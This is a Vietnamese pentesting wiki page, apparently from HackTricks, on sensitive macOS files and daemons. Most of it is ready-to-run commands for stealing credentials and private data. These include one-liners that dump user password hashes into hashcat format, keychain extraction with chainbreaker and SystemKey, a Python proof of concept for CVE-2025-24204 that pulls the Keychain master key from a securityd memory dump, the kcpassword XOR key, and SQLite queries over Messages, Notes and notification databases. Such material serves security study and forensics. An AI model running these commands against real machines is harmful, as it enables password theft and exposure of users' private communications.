# Các vị trí nhạy cảm và daemon đáng chú ý trên macOS

{{#include ../../../banners/hacktricks-training.md}}


## Mật khẩu

### Shadow Passwords

Shadow password được lưu cùng với cấu hình của người dùng trong các plist nằm tại **`/var/db/dslocal/nodes/Default/users/`**.\
Có thể dùng one-liner sau để dump **toàn bộ thông tin về người dùng** (bao gồm thông tin hash):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Các script như thế này**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) hoặc [**script này**](https://github.com/octomagon/davegrohl.git) có thể được dùng để chuyển đổi hash sang **định dạng** **hashcat**.

Một one-liner khác để dump creds của tất cả tài khoản không phải dịch vụ theo định dạng hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Một cách khác để lấy `ShadowHashData` của người dùng là dùng `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Chuyển đổi ShadowHashData đã sao chép trên Linux

Nếu thuộc tính được sao chép sang máy chủ cracking Linux, hãy chỉ lưu **các byte thập lục phân** của nó (không bao gồm nhãn `ShadowHashData:`) vào `shadowhash.hex`. Trên Ubuntu, `libplist-utils` chuyển plist nhị phân đã giải mã thành XML dễ đọc mà không cần `plutil` của macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

Trong XML, hãy dùng `iterations` cùng với `salt` và `entropy` dạng base64 từ **`SALTED-SHA512-PBKDF2`**, không dùng SRP verifier riêng. Đặt `salt_b64` và `entropy_b64` lần lượt bằng nội dung của các thẻ XML `<data>` tương ứng. Giải mã chúng sang hex và tạo một dòng theo định dạng `$ml$<iterations>$<salt_hex>$<entropy_hex>` cho Hashcat mode `7100`. Đây là hoạt động đoán mật khẩu offline sau khi thu thập hash bằng quyền đặc quyền, không phải phương pháp truy cập ban đầu hoặc leo thang đặc quyền.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Tệp này **chỉ được sử dụng** khi hệ thống chạy ở **single-user mode** (nên không thường xuyên).

### Keychain Dump

Lưu ý rằng khi dùng binary `security` để **dump các mật khẩu đã giải mã**, một số lời nhắc sẽ yêu cầu người dùng cho phép thao tác này.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Trên các phiên bản macOS hiện đại, những nơi lưu trữ nền đáng chú ý nhất thường là **`~/Library/Keychains/login.keychain-db`** và **`/Library/Keychains/System.keychain`**. Đây là các tệp được SQLite hỗ trợ, nhưng quyền truy cập dữ liệu dạng plaintext vẫn được trung gian xử lý bởi **`securityd`**: lấy cắp DB thô chủ yếu chỉ cung cấp metadata và các blob đã mã hóa, trừ khi bạn cũng khôi phục được mật khẩu của người dùng, `SystemKey` hoặc master key trong bộ nhớ.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Dựa trên bình luận này [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), có vẻ các công cụ này không còn hoạt động trên Big Sur.

### Tổng quan về Keychaindump

Một công cụ có tên **keychaindump** được phát triển để trích xuất mật khẩu từ macOS keychain, nhưng công cụ này gặp hạn chế trên các phiên bản macOS mới hơn như Big Sur, theo một [cuộc thảo luận](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Để sử dụng **keychaindump**, attacker cần giành quyền truy cập và leo thang đặc quyền lên **root**. Công cụ khai thác việc keychain mặc định được mở khóa khi người dùng đăng nhập để thuận tiện, cho phép ứng dụng truy cập mà không phải yêu cầu người dùng nhập lại mật khẩu. Tuy nhiên, nếu người dùng chọn khóa keychain sau mỗi lần sử dụng, **keychaindump** sẽ không hiệu quả.

**Keychaindump** hoạt động bằng cách nhắm mục tiêu vào một tiến trình cụ thể có tên **securityd**, được Apple mô tả là daemon thực hiện các hoạt động ủy quyền và mật mã, giữ vai trò thiết yếu trong việc truy cập keychain. Quá trình trích xuất bao gồm xác định một **Master Key** được tạo ra từ mật khẩu đăng nhập của người dùng. Khóa này cần thiết để đọc tệp keychain. Để tìm **Master Key**, **keychaindump** quét heap bộ nhớ của **securityd** bằng lệnh `vmmap`, tìm các khóa tiềm năng trong những vùng được đánh dấu là `MALLOC_TINY`. Lệnh sau được dùng để kiểm tra các vị trí bộ nhớ này:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Sau khi xác định các master key tiềm năng, **keychaindump** tìm kiếm trong các heap một mẫu cụ thể (`0x0000000000000018`) cho biết vị trí của một ứng viên master key. Cần thực hiện thêm các bước, bao gồm giải obfuscation, để sử dụng khóa này, như được trình bày trong mã nguồn của **keychaindump**. Các nhà phân tích tập trung vào lĩnh vực này cần lưu ý rằng dữ liệu quan trọng để giải mã keychain được lưu trong bộ nhớ của tiến trình **securityd**. Lệnh ví dụ để chạy **keychaindump** là:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) có thể trích xuất các loại thông tin sau từ macOS keychain theo cách đảm bảo tính pháp chứng:

- Mật khẩu Keychain đã băm, phù hợp để crack bằng [hashcat](https://hashcat.net/hashcat/) hoặc [John the Ripper](https://www.openwall.com/john/)
- Mật khẩu Internet
- Mật khẩu Generic
- Private Keys
- Public Keys
- Chứng chỉ X509
- Secure Notes
- Mật khẩu Appleshare

Khi có mật khẩu mở khóa keychain, master key lấy được bằng [volafox](https://github.com/n0fate/volafox) hoặc [volatility](https://github.com/volatilityfoundation/volatility), hoặc tệp mở khóa như SystemKey, Chainbreaker cũng sẽ cung cấp mật khẩu dạng plaintext.

Nếu không dùng một trong các phương thức này để mở khóa Keychain, Chainbreaker sẽ hiển thị mọi thông tin khác hiện có.

#### **Trích xuất key của keychain**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump các khóa keychain (kèm mật khẩu) bằng SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keys trong keychain (có mật khẩu), crack hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump khóa keychain (kèm mật khẩu) bằng memory dump**

[Thực hiện theo các bước này](../index.html#dumping-memory-with-osxpmem) để tạo **memory dump**.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) bằng mật khẩu người dùng**

Nếu biết mật khẩu người dùng, bạn có thể dùng mật khẩu đó để **dump và giải mã các keychain thuộc về người dùng**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Keychain master key thông qua entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) được phát hành với entitlement **`com.apple.system-task-ports.read`** trong `/usr/bin/gcore`, nên bất kỳ admin cục bộ nào (hoặc ứng dụng có chữ ký độc hại) đều có thể dump **bộ nhớ của bất kỳ process nào, ngay cả khi SIP/TCC được thực thi**. Dump `securityd` làm lộ **Keychain master key** ở dạng cleartext và cho phép giải mã `login.keychain-db` mà không cần mật khẩu người dùng.<sup>[[1]](#references)</sup>

**Tái hiện nhanh trên các bản build dễ bị tấn công (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Đưa khóa hex đã trích xuất vào Chainbreaker (`--key <hex>`) để giải mã login keychain. Apple đã xóa entitlement này trong **macOS 15.3+**, vì vậy cách này chỉ hoạt động trên các bản Sequoia chưa được vá hoặc hệ thống vẫn giữ binary dễ bị tấn công.

### kcpassword

Tệp **kcpassword** chứa **mật khẩu đăng nhập của người dùng**, nhưng chỉ khi chủ sở hữu hệ thống đã **bật tính năng đăng nhập tự động**. Khi đó, người dùng sẽ tự động đăng nhập mà không cần nhập mật khẩu (điều này không an toàn lắm).

Mật khẩu được lưu trong tệp **`/etc/kcpassword`**, được XOR với khóa **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Nếu mật khẩu của người dùng dài hơn khóa, khóa sẽ được dùng lại.\
Do đó, việc khôi phục mật khẩu khá dễ dàng, chẳng hạn bằng các script như [**script này**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Thông tin thú vị trong cơ sở dữ liệu

### Tin nhắn

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

Trước **Sequoia**, bạn thường có thể tìm thấy cơ sở dữ liệu của Notification Center tại **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Trong **Sequoia+**, Apple đã chuyển nó vào group container được TCC bảo vệ **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Phần lớn thông tin đáng chú ý được lưu trong các cột **blob**, vì vậy bạn cần trích xuất nội dung đó và chuyển đổi thành định dạng mà con người có thể đọc được (`plutil -p -`, `strings` hoặc một parser nhỏ). Ví dụ triage nhanh:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Các vấn đề quyền riêng tư gần đây (cơ sở dữ liệu NotificationCenter)

- Trong macOS **14.7–15.1**, Apple lưu nội dung banner trong SQLite `db2/db` mà không che dữ liệu đúng cách. Các CVE **CVE-2024-44292/44293/40838/54504** cho phép bất kỳ người dùng cục bộ nào đọc nội dung thông báo của người dùng khác chỉ bằng cách mở cơ sở dữ liệu (không cần lời nhắc TCC).<sup>[[3]](#references)</sup>
- Apple đã giảm thiểu vấn đề này bằng cách chuyển cơ sở dữ liệu vào `group.com.apple.usernoted` và bảo vệ bằng TCC trên các bản Sequoia mới hơn, vì vậy trên các hệ thống hiện tại, thông thường bạn cần đúng ngữ cảnh người dùng hoặc một TCC bypass để đọc dữ liệu.<sup>[[4]](#references)</sup>
- Trên các endpoint cũ, hãy sao chép cả ba tệp `db`, `db-wal` và `db-shm` trước khi cập nhật hoặc khởi động lại nếu bạn muốn giữ lại các dấu vết.

### Ghi chú

Ghi chú của người dùng có thể được tìm thấy tại `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Nếu one-liner ở trên tạo quá nhiều nhiễu, hãy export `ZICNOTEDATA.ZDATA`, giải nén bằng gunzip rồi phân tích protobuf: cách này thường đáng tin cậy hơn chạy `strings` trực tiếp trên SQLite.

### Tác vụ nền / Mục đăng nhập

Kể từ **Ventura**, các mục đăng nhập được người dùng phê duyệt và một số tác vụ nền được theo dõi trong các kho dữ liệu **BTM**, chẳng hạn như **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** và bộ nhớ đệm hệ thống có phiên bản **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Các tệp này hữu ích để nhanh chóng xác định persistence, công cụ hỗ trợ và một số mục nền do MDM quản lý:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Để biết thêm về khía cạnh persistence và các thông tin nội bộ của BTM, hãy xem [trang về các vị trí tự khởi chạy](../../macos-auto-start-locations.md#login-items) và [ghi chú về Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Tùy chọn

Trong các ứng dụng macOS, tùy chọn nằm trong **`$HOME/Library/Preferences`**; còn trên iOS, chúng nằm trong `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Trên macOS, có thể dùng công cụ cli **`defaults`** để **sửa đổi file Preferences**.

**`/usr/sbin/cfprefsd`** đăng ký các dịch vụ XPC `com.apple.cfprefsd.daemon` và `com.apple.cfprefsd.agent`, đồng thời có thể được gọi để thực hiện các hành động như sửa đổi tùy chọn.

## Quyền trong OpenDirectory permissions.plist

File `/System/Library/OpenDirectory/permissions.plist` chứa các quyền áp dụng cho thuộc tính node và được bảo vệ bởi SIP.\
File này cấp quyền cho những người dùng cụ thể theo UUID (không phải uid), cho phép họ truy cập một số thông tin nhạy cảm như `ShadowHashData`, `HeimdalSRPKey` và `KerberosKeys`, cùng những thông tin khác:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Thông báo hệ thống

### Thông báo Darwin

Daemon chính xử lý thông báo là **`/usr/sbin/notifyd`**. Để nhận thông báo, các client phải đăng ký qua Mach port `com.apple.system.notification_center` (kiểm tra bằng `sudo lsmp -p <pid notifyd>`). Có thể cấu hình daemon bằng tệp `/etc/notify.conf`.

Tên dùng cho thông báo là các ký hiệu reverse DNS duy nhất. Khi một thông báo được gửi đến một tên, các client đã cho biết rằng chúng có thể xử lý thông báo đó sẽ nhận được thông báo.

Có thể dump trạng thái hiện tại (và xem tất cả tên) bằng cách gửi tín hiệu SIGUSR2 đến tiến trình notifyd rồi đọc tệp được tạo: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

**Distributed Notification Center**, có binary chính là **`/usr/sbin/distnoted`**, là một cách khác để gửi thông báo. Nó cung cấp một số dịch vụ XPC và thực hiện một số kiểm tra để cố gắng xác minh client.

### Apple Push Notifications (APN)

Trong trường hợp này, các ứng dụng có thể đăng ký **topics**. Client sẽ tạo một token bằng cách liên hệ với máy chủ của Apple thông qua **`apsd`**.\
Sau đó, các provider cũng sẽ tạo token và có thể kết nối với máy chủ của Apple để gửi tin nhắn đến client. Các tin nhắn này sẽ được **`apsd`** nhận cục bộ, rồi chuyển tiếp thông báo đến ứng dụng đang chờ.

Các tùy chọn được lưu tại `/Library/Preferences/com.apple.apsd.plist`.

macOS có cơ sở dữ liệu cục bộ chứa các tin nhắn tại `/Library/Application\ Support/ApplePushService/aps.db`, còn iOS lưu tại `/var/mobile/Library/ApplePushService`. Cơ sở dữ liệu có 3 bảng: `incoming_messages`, `outgoing_messages` và `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Cũng có thể lấy thông tin về daemon và các kết nối bằng cách sử dụng:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Thông báo cho người dùng

Đây là những thông báo mà người dùng sẽ thấy trên màn hình:

- **`CFUserNotification`**: API này cung cấp cách hiển thị cửa sổ bật lên có thông báo trên màn hình.
- **The Bulletin Board**: Trên iOS, dịch vụ này hiển thị banner rồi banner sẽ biến mất và được lưu trong Notification Center.
- **`NSUserNotificationCenter`**: Dịch vụ notification-center cũ trên macOS. Trên các phiên bản cũ hơn, cơ sở dữ liệu thường nằm tại `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; từ Sequoia trở đi, cơ sở dữ liệu được chuyển đến `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – Entitlement gcore của macOS cho phép trích xuất khóa chính Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Bảo vệ dữ liệu Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Rò rỉ dữ liệu SQLite của Notification Center (CVE-2024-44292 và các lỗ hổng khác)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple giải quyết lo ngại về quyền riêng tư xung quanh cơ sở dữ liệu Notification Center trong macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Bẻ khóa mật khẩu macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat – Các hash mẫu cho macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
